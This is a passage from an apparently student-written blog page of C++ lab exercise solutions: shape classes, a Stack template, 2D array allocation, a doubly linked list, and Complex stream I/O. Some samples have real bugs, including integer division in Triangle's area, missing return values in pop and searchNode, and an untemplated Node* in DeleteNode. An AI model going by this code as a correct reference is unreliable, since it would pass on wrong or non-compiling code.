class="title">getGirth</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span> * Shape::pi * _r; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ellipse</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _a; <span class="type">int</span> _b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Ellipse</span>(<span class="type">int</span> a = <span class="number">0</span>, <span class="type">int</span> b = <span class="number">0</span>) : _a(a), _b(b) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getArea</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _a * _b * Shape::pi; &#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getGirth</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Shape::pi * (_a + _b); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _a; <span class="type">int</span> _b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Rectangle</span>(<span class="type">int</span> a = <span class="number">0</span>, <span class="type">int</span> b = <span class="number">0</span>) : _a(a), _b(b) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getArea</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _a * _b; &#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getGirth</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span> * (_a + _b); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Triangle</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _a; <span class="type">int</span> _b; <span class="type">int</span> _c;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Triangle</span>(<span class="type">int</span> a = <span class="number">0</span>, <span class="type">int</span> b = <span class="number">0</span>, <span class="type">int</span> c = <span class="number">0</span>) : _a(a), _b(b), _c(c) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getArea</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">double</span> s = (_a + _b + _c) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">sqrt</span>(s * (s - _a) * (s - _b) * (s - _c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getGirth</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _a + _b + _c; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Round <span class="title">a</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>)</span></span>; <span class="function">Ellipse <span class="title">b</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>)</span></span>; <span class="function">Triangle <span class="title">c</span><span class="params">(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line"><span class="function">Rectangle <span class="title">d</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>)</span></span>; Shape* p = &amp;a;</span><br><span class="line">cout &lt;&lt; p-&gt;<span class="built_in">getGirth</span>() &lt;&lt; endl; p = &amp;b;</span><br><span class="line">cout &lt;&lt; p-&gt;<span class="built_in">getGirth</span>() &lt;&lt; endl; p = &amp;c;</span><br><span class="line">cout &lt;&lt; p-&gt;<span class="built_in">getGirth</span>() &lt;&lt; endl; p = &amp;d;</span><br><span class="line">cout &lt;&lt; p-&gt;<span class="built_in">getGirth</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验八">实验八</h2><h3 id="1．定义一个-Stack-类模板，实现多种数据类型的栈操作。">1．定义一个 Stack 类模板，实现多种数据类型的栈操作。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">T value;</span><br><span class="line">node&lt;T&gt;* next;</span><br><span class="line"><span class="built_in">node</span>() :<span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">node</span>(T t) :<span class="built_in">value</span>(t), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> cnts; node&lt;T&gt;* head;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Stack</span>() &#123; cnts = <span class="number">0</span>; head = <span class="keyword">new</span> node&lt;T&gt;; &#125;</span><br><span class="line"><span class="built_in">Stack</span>(<span class="type">int</span> a) &#123; cnts = a; head = <span class="keyword">new</span> node&lt;T&gt;; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(T arg)</span></span>; <span class="function">T <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> Stack&lt;T&gt;::<span class="built_in">push</span>(T arg) &#123;</span><br><span class="line">node&lt;T&gt;* pnode = <span class="keyword">new</span> <span class="built_in">node</span>&lt;T&gt;(arg);</span><br><span class="line">pnode-&gt;next = head-&gt;next;</span><br><span class="line">head-&gt;next = pnode;</span><br><span class="line">cnts++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T Stack&lt;T&gt;::<span class="built_in">pop</span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (head-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">node&lt;T&gt;* temp = head-&gt;next;</span><br><span class="line">head-&gt;next = head-&gt;next-&gt;next;</span><br><span class="line">T popVal = temp-&gt;value;</span><br><span class="line"><span class="keyword">delete</span> temp;</span><br><span class="line"><span class="keyword">return</span> popVal;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Stack&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line">a.<span class="built_in">push</span>(<span class="number">10</span>); a.<span class="built_in">push</span>(<span class="number">20</span>);</span><br><span class="line">cout &lt;&lt; a.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-定义函数模板实现任意类型动态二维数组的分配。">2. 定义函数模板实现任意类型动态二维数组的分配。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function">T** <span class="title">dmalloc</span><span class="params">(<span class="type">int</span> rows, <span class="type">int</span> cols)</span> </span>&#123;</span><br><span class="line">T** a = <span class="literal">NULL</span>;</span><br><span class="line">a = <span class="keyword">new</span> T * [rows + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; rows + <span class="number">1</span>; i++) &#123; a[i] = <span class="keyword">new</span> T[cols]; &#125;</span><br><span class="line">a[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">int</span>(rows); <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfree</span><span class="params">(T** a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (*a[<span class="number">0</span>]) + <span class="number">1</span>; i++) &#123; <span class="keyword">delete</span>[] a[i]; &#125;</span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">delete</span>[] a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span>** p = <span class="built_in">dmalloc</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">p[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">10</span>;</span><br><span class="line">cout &lt;&lt; p[<span class="number">0</span>][<span class="number">2</span>] &lt;&lt; endl;</span><br><span class="line"><span class="built_in">dfree</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>定义一个类模板，实现双向链表 dlist 的常规操作，如添加节点、删除节点、插入节点、查找节点、遍历节点等。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">T data; Node&lt;T&gt;* pPre, * pNext;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubleLinkList</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">DoubleLinkList</span>() &#123;</span><br><span class="line">head = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">head-&gt;data = <span class="number">0</span>;</span><br><span class="line">head-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line">head-&gt;pPre = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">DoubleLinkList</span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (head != <span class="literal">NULL</span>)<span class="keyword">delete</span> head; head = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateLinkList</span><span class="params">(T n)</span></span>;<span class="comment">//添加节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertNode</span><span class="params">(<span class="type">int</span> position, T d)</span></span>;<span class="comment">//在指定位置处插入结点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseLinkList</span><span class="params">()</span></span>;<span class="comment">//遍历链表</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetLength</span><span class="params">()</span></span>;<span class="comment">//获得链表长度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteNode</span><span class="params">(<span class="type">int</span> position)</span></span>;<span class="comment">//删除指定位置处结点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteLinkList</span><span class="params">()</span></span>;<span class="comment">//清空链表</span></span><br><span class="line"><span class="function">T&amp; <span class="title">searchNode</span><span class="params">(<span class="type">int</span> index)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Node&lt;T&gt;* head;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> DoubleLinkList&lt;T&gt;::<span class="built_in">CreateLinkList</span>(T n) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入结点个数错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">Node&lt;T&gt;* pnew, * ptemp;</span><br><span class="line">ptemp = head;</span><br><span class="line">i = n;</span><br><span class="line"><span class="keyword">while</span> (n-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i - n &lt;&lt; <span class="string">&quot;个结点值：&quot;</span>;</span><br><span class="line">pnew = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">cin &gt;&gt; pnew-&gt;data;</span><br><span class="line">pnew-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line">pnew-&gt;pPre = ptemp;</span><br><span class="line">ptemp-&gt;pNext = pnew;</span><br><span class="line">ptemp = pnew;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> DoubleLinkList&lt;T&gt;::<span class="built_in">DeleteNode</span>(<span class="type">int</span> position) &#123;</span><br><span class="line"><span class="keyword">if</span> (position &lt; <span class="number">0</span> || position &gt; <span class="built_in">GetLength</span>()) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入数据错误!&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Node* pdelete, * ptemp;</span><br><span class="line">ptemp = head;</span><br><span class="line"><span class="keyword">while</span> (position-- &gt; <span class="number">1</span>)ptemp = ptemp-&gt;pNext;</span><br><span class="line">pdelete = ptemp-&gt;pNext;</span><br><span class="line"><span class="keyword">if</span> (pdelete-&gt;pNext != <span class="literal">NULL</span>)pdelete-&gt;pNext-&gt;pPre = ptemp;</span><br><span class="line">ptemp-&gt;pNext = pdelete-&gt;pNext;</span><br><span class="line"><span class="keyword">delete</span> pdelete;</span><br><span class="line">pdelete = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">int</span> DoubleLinkList&lt;T&gt;::<span class="built_in">GetLength</span>() &#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">Node&lt;T&gt;* ptemp = head-&gt;pNext;</span><br><span class="line"><span class="keyword">while</span> (ptemp != <span class="literal">NULL</span>) &#123; n++; ptemp = ptemp-&gt;pNext; &#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> DoubleLinkList&lt;T&gt;::<span class="built_in">InsertNode</span>(<span class="type">int</span> position, T d) &#123;</span><br><span class="line"><span class="keyword">if</span> (position &lt; <span class="number">0</span> || position &gt; <span class="built_in">GetLength</span>() + <span class="number">1</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入位置错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Node&lt;T&gt;* pnew, * ptemp;</span><br><span class="line">pnew = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">pnew-&gt;data = d;</span><br><span class="line">ptemp = head;</span><br><span class="line"><span class="keyword">while</span> (position-- &gt; <span class="number">1</span>)ptemp = ptemp-&gt;pNext;</span><br><span class="line"><span class="keyword">if</span> (ptemp-&gt;pNext != <span class="literal">NULL</span>)ptemp-&gt;pNext-&gt;pPre = pnew;</span><br><span class="line">pnew-&gt;pNext = ptemp-&gt;pNext;</span><br><span class="line">pnew-&gt;pPre = ptemp;</span><br><span class="line">ptemp-&gt;pNext = pnew;</span><br><span class="line">ptemp = pnew;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> DoubleLinkList&lt;T&gt;::<span class="built_in">TraverseLinkList</span>() &#123;</span><br><span class="line">Node&lt;T&gt;* ptemp = head-&gt;pNext;</span><br><span class="line"><span class="keyword">while</span> (ptemp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">cout &lt;&lt; ptemp-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">ptemp = ptemp-&gt;pNext;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T&amp; DoubleLinkList&lt;T&gt;::<span class="built_in">searchNode</span>(<span class="type">int</span> index) &#123;</span><br><span class="line"><span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; <span class="built_in">GetLength</span>() + <span class="number">1</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输入位置错误！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Node&lt;T&gt;* ptemp;</span><br><span class="line">ptemp = head;</span><br><span class="line"><span class="keyword">while</span> (index-- &gt; <span class="number">1</span>)ptemp = ptemp-&gt;pNext;</span><br><span class="line">cout &lt;&lt; ptemp-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> DoubleLinkList&lt;T&gt;::<span class="built_in">DeleteLinkList</span>() &#123;</span><br><span class="line">Node&lt;T&gt;* pdelete, * ptemp;</span><br><span class="line">pdelete = head-&gt;pNext;</span><br><span class="line"><span class="keyword">while</span> (pdelete != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ptemp = pdelete-&gt;pNext;</span><br><span class="line">head-&gt;pNext = ptemp;</span><br><span class="line"><span class="keyword">if</span> (ptemp != <span class="literal">NULL</span>)ptemp-&gt;pPre = head;</span><br><span class="line"><span class="keyword">delete</span> pdelete;</span><br><span class="line">pdelete = ptemp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DoubleLinkList&lt;<span class="type">int</span>&gt; dlist;</span><br><span class="line">dlist.<span class="built_in">CreateLinkList</span>(<span class="number">4</span>);</span><br><span class="line">dlist.<span class="built_in">InsertNode</span>(<span class="number">3</span>, <span class="number">11</span>);</span><br><span class="line">dlist.<span class="built_in">InsertNode</span>(<span class="number">2</span>, <span class="number">13</span>);</span><br><span class="line">dlist.<span class="built_in">InsertNode</span>(<span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">dlist.<span class="built_in">TraverseLinkList</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验九">实验九</h2><h3 id="1．通过运算符重载，使得-ifstream-与-ofstream-能直接写读-complex-类对象。">1．通过运算符重载，使得 ifstream 与 ofstream 能直接写读 complex 类对象。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span> &#123;</span><br><span class="line"><span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp; is, Complex&amp; c);</span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, <span class="type">const</span> Complex&amp; c);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> a;<span class="comment">//实部</span></span><br><span class="line"><span class="type">int</span> b;<span class="comment">//虚部</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Complex</span>() &#123;&#125;</span><br><span class="line"><span class="built_in">Complex</span>(<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;a = a;</span><br><span class="line"><span class="keyword">this</span>-&gt;b = b;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Complex</span>() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp; is, Complex&amp; c) &#123;</span><br><span class="line">is &gt;&gt; c.a; is &gt;&gt; c.b; <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, <span class="type">const</span> Complex&amp; c) &#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;实部：&quot;</span> &lt;&lt; c.a &lt;&lt; <span class="string">&quot; 虚部：&quot;</span> &lt;&lt; c.b &lt;&lt; endl; <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">fout</span><span class="params">(<span class="string">&quot;complex.txt&quot;</span>)</span></span>; <span class="function">Complex <span class="title">c1</span><span class="params">(<span class="number">3</span>, <span class="number">4</span>)</span></span>; fout &lt;&lt; c1; fout.<span class="built_in">close</span>();</span><br><span class="line"><span class="function">ifstream <span class="title">fin</span><span class="params">(<span class="string">&quot;complex.txt&quot;</span>)</span></span>; Complex c2; fin &gt;&gt; c2; fin.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-编写程序，建立一个文件-1-txt，然后从计算机键盘向文件输入数据，直到敲入回车符终止，然后再将文件内容进行输出。">2. 编写程序，建立一个文件 1.txt，然后从计算机键盘向文件输入数据，直到敲入回车符终止，然后再将文件内容进行输出。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;2.txt&quot;</span>)</span></span>;</span><br><span class="line">string a;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">ofs &lt;&lt; a;</span><br><span class="line">ofs.<span 